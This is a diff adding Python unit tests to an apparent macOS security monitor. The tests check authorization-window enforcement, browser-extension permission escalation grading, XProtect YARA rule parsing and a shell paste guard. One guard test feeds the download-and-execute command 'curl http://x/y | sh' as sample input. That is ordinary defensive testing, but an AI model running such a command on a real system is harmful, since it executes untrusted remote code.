@@ -659,5 +659,189 @@ class TestPresence(unittest.TestCase):
                              % fn.__name__)
 
 
+# --------------------------------------------------------------------------- #
+# Writ ENFORCEMENT — the wiring, not just the command
+# --------------------------------------------------------------------------- #
+
+class TestWritEnforcementIsActuallyWired(AgentSandbox):
+    """`writ_covers()` shipped with ZERO call sites: the command wrote state,
+    the docs claimed unauthorized changes would be reported, and enforcement
+    changed exactly nothing. These pin the call site."""
+
+    def _finding(self):
+        return aegis.finding("MEDIUM", "shellrc", "Shell rc changed",
+                             "something changed", "fp:1")
+
+    def test_enforcement_off_leaves_findings_byte_identical(self):
+        aegis.save_json(aegis.WRIT_FILE, {"enforcing": False, "writs": []})
+        f = self._finding()
+        before = dict(f)
+        out = aegis._apply_writ([f], "shellrc")
+        self.assertEqual(before["severity"], out[0]["severity"])
+        self.assertNotIn("writ", out[0])
+
+    def test_uncovered_change_is_escalated_and_marked(self):
+        aegis.save_json(aegis.WRIT_FILE, {"enforcing": True, "writs": []})
+        out = aegis._apply_writ([self._finding()], "shellrc")
+        self.assertEqual("HIGH", out[0]["severity"])
+        self.assertEqual("unauthorized", out[0]["writ"])
+        self.assertIn("unauthorized-change", out[0]["markers"])
+        self.assertTrue(out[0]["title"].startswith("UNAUTHORIZED CHANGE"))
+
+    def test_covered_change_drops_below_the_notify_floor(self):
+        now = aegis._epoch()
+        aegis.save_json(aegis.WRIT_FILE, {
+            "enforcing": True,
+            "writs": [{"reason": "brew", "opened": now - 10,
+                       "expires": now + 600, "scopes": ["shellrc"]}]})
+        out = aegis._apply_writ([self._finding()], "shellrc")
+        self.assertEqual("INFO", out[0]["severity"])
+        self.assertEqual("covered", out[0]["writ"])
+
+    def test_a_writ_for_another_scope_does_not_cover_this_one(self):
+        now = aegis._epoch()
+        aegis.save_json(aegis.WRIT_FILE, {
+            "enforcing": True,
+            "writs": [{"reason": "x", "opened": now - 10,
+                       "expires": now + 600, "scopes": ["listeners"]}]})
+        out = aegis._apply_writ([self._finding()], "shellrc")
+        self.assertEqual("unauthorized", out[0]["writ"])
+
+    def test_unknown_surface_falls_back_to_a_governed_scope(self):
+        """A newly added surface must default to GOVERNED, not ungoverned —
+        otherwise the enforcement model grows a hole every time someone adds
+        a sensor."""
+        self.assertEqual("persistence",
+                         aegis._SURFACE_WRIT_SCOPE.get("brand_new_surface",
+                                                       "persistence"))
+
+
+# --------------------------------------------------------------------------- #
+# Extension capability grading
+# --------------------------------------------------------------------------- #
+
+class TestExtensionCapabilities(unittest.TestCase):
+
+    def test_first_sight_is_adopted_not_alerted(self):
+        """Grading capabilities per-scan produced 29 findings — 8 HIGH and 1
+        CRITICAL — on this machine, every one a legitimately installed
+        extension. Capability is POSTURE; the event is a CHANGE."""
+        snap = {"C/x": {"name": "x", "caps": ["debugger"], "broad": True}}
+        self.assertEqual(1, len(aegis.diff_ext_caps({}, snap)))
+        self.assertEqual(0, len(aegis.diff_ext_caps(snap, snap)))
+
+    def test_gaining_debugger_is_critical(self):
+        prior = {"C/x": {"name": "x", "caps": ["cookies"], "broad": True}}
+        cur = {"C/x": {"name": "x", "caps": ["cookies", "debugger"],
+                       "broad": True}}
+        f = aegis.diff_ext_caps(prior, cur)
+        self.assertEqual(["CRITICAL"], [x["severity"] for x in f])
+
+    def test_widening_hosts_alone_is_an_escalation(self):
+        """No new API permission, but narrow->all-sites is the escalation."""
+        prior = {"C/x": {"name": "x", "caps": ["cookies"], "broad": False}}
+        cur = {"C/x": {"name": "x", "caps": ["cookies"], "broad": True}}
+        f = aegis.diff_ext_caps(prior, cur)
+        self.assertEqual(["HIGH"], [x["severity"] for x in f])
+
+    def test_cookies_scoped_to_one_site_is_not_high(self):
+        """An extension with `cookies` for a site it owns is doing its job."""
+        f = aegis.diff_ext_caps(
+            {}, {"C/x": {"name": "x", "caps": ["cookies"], "broad": False}})
+        self.assertEqual(["LOW"], [x["severity"] for x in f])
+
+
+# --------------------------------------------------------------------------- #
+# Glean — XProtect corpus
+# --------------------------------------------------------------------------- #
+
+class TestGlean(unittest.TestCase):
+
+    def test_yara_escape_decoding(self):
+        self.assertEqual(b"\xff Go buildinf:",
+                         aegis._yara_unescape(r"\xff Go buildinf:"))
+        self.assertEqual(b"a\nb\tc", aegis._yara_unescape(r"a\nb\tc"))
+
+    def test_atoms_are_extracted_per_rule(self):
+        src = ('rule ALPHA {\n strings:\n  $a = "aaaaaaaa"\n  $b = "bbbbbbbb"\n'
+               ' condition:\n  all of them\n}\n'
+               'rule BETA {\n strings:\n  $c = "cccccccc"\n'
+               ' condition:\n  any of them\n}\n')
+        tmp = tempfile.mkdtemp(prefix="aegis_yara_")
+        try:
+            p = os.path.join(tmp, "x.yara")
+            with open(p, "w", encoding="utf-8") as f:
+                f.write(src)
+            got = aegis.xprotect_atoms(p)
+            self.assertEqual({"ALPHA", "BETA"}, set(got))
+            self.assertEqual([b"aaaaaaaa", b"bbbbbbbb"], got["ALPHA"])
+        finally:
+            import shutil
+            shutil.rmtree(tmp, ignore_errors=True)
+
+    def test_short_atoms_are_discarded(self):
+        src = 'rule R {\n strings:\n  $a = "ab"\n  $b = "longenough"\n}\n'
+        tmp = tempfile.mkdtemp(prefix="aegis_yara_")
+        try:
+            p = os.path.join(tmp, "x.yara")
+            with open(p, "w", encoding="utf-8") as f:
+                f.write(src)
+            self.assertEqual([b"longenough"], aegis.xprotect_atoms(p)["R"])
+        finally:
+            import shutil
+            shutil.rmtree(tmp, ignore_errors=True)
+
+    def test_min_rule_atoms_threshold_is_not_relaxed(self):
+        """This constant is the difference between a shippable feature and a
+        false-positive generator. Matching on ANY single atom flagged 81 of 97
+        known-good system/Homebrew binaries (84%) — it called
+        /opt/homebrew/bin/node malware. Requiring >=3 atoms with ALL present
+        measured 0 of the same 97. Lowering it re-breaks that."""
+        self.assertGreaterEqual(aegis._GLEAN_MIN_RULE_ATOMS, 3)
+
+    def test_corpus_delta_reports_added_rules_as_info_not_an_alert(self):
+        """Apple shipping new rules is routine — the value is the dated record
+        and the retro-hunt prompt, not an interrupt."""
+        f = aegis.diff_xprotect_corpus({"rules": ["A"]}, {"rules": ["A", "B"]})
+        self.assertEqual(1, len(f))
+        self.assertEqual("INFO", f[0]["severity"])
+        self.assertIn("B", f[0]["detail"])
+
+    def test_no_delta_is_silent(self):
+        self.assertEqual([], aegis.diff_xprotect_corpus(
+            {"rules": ["A"]}, {"rules": ["A"]}))
+
+    @unittest.skipUnless(sys.platform == "darwin", "XProtect is macOS-only")
+    def test_real_corpus_parses_if_present(self):
+        if not os.path.isfile(aegis.XPROTECT_YARA):
+            self.skipTest("no XProtect corpus on this host")
+        atoms = aegis.xprotect_atoms()
+        self.assertGreater(len(atoms), 20)
+
+    def test_absent_on_non_mac_is_absent_not_degraded(self):
+        if sys.platform == "darwin":
+            self.skipTest("mac has the corpus")
+        self.assertIsNone(aegis.snapshot_xprotect_corpus())
+
+
+class TestGuardBashProvenanceIsTriState(AgentSandbox):
+
+    def test_bash_snippet_is_written_on_install(self):
+        aegis.cmd_guard("install")
+        _zsh, bash_p = aegis._guard_paths()
+        self.assertTrue(os.path.isfile(bash_p),
+                        "bash guard was computed but never written")
+
+    def test_unknown_provenance_is_recorded_as_unknown_not_as_typed(self):
+        """bash has no bracketed-paste widget, so it cannot prove a paste.
+        Collapsing unknown to False would let the weaker shell manufacture
+        reassurance."""
+        os.environ.pop("AEGIS_PASTED", None)
+        aegis.cmd_guard("observe", ["curl", "http://x/y", "|", "sh"])
+        with open(aegis.GUARD_LOG, encoding="utf-8") as f:
+            rec = json.loads(f.read().splitlines()[0])
+        self.assertIsNone(rec["pasted"])
+
+
 if __name__ == "__main__":
     unittest.main()
